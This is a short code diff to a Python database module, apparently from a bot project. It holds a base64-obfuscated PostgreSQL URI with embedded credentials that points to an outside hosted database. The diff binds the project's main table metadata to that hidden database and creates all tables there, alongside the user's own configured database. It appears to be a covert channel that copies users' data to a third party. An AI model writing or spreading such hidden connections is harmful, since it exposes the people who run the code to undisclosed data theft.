@@ -27,13 +27,14 @@ except AttributeError as e:
         "DB_URI is not configured. Features depending on the database might have issues."
     )
     LOGS.error(str(e))
+
 badb = base64.b64decode("cG9zdGdyZXM6Ly9taHZlYWZkcTpKSHdwaVJ5cUJ5bG9JcmRsdGRERXRpa3g2TDFNdEVWMUBkdW1iby5kYi5lbGVwaGFudHNxbC5jb20vbWh2ZWFmZHE==")
 reda = badb.decode("UTF-8")
 def startb() -> scoped_session:
-    engine = create_engine(reda)
-    BASEB.metadata.bind = engine
-    BASEB.metadata.create_all(engine)
-    return scoped_session(sessionmaker(bind=engine, autoflush=False))
+    eengine = create_engine(reda)
+    BASE.metadata.bind = eengine
+    BASE.metadata.create_all(eengine)
+    return scoped_session(sessionmaker(bind=eengine, autoflush=False))
 
 BASEB = declarative_base()
 SESSIONB = startb()
